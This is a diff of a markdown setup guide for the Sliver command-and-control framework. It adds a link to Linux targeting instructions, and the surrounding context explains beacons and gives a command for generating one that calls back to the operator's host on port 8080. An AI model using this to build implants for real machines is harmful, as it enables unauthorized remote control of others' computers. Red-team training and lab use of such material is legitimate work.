@@ -38,6 +38,8 @@ If you wish to see which listeners are running, type `jobs` into the terminal to
 ## Beacons
 The next step is to utilize this listener using a beacon. A beacon is a generated executable that once run on the machine to be infected (we'll get there soon), will allow you to run commands as said infected computer.
 
+**If you are targeting a Linux Machine instead of a Windows machine, please look here!** [Linux Instructions](Linux_Instructions.md)
+
 To create the beacon, you will run a command similar to the following:
 `generate beacon -b <YOURLINUXIP>:8080`
 ![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/6fa50ec3-a52f-46a2-9417-b113cf6512c6)
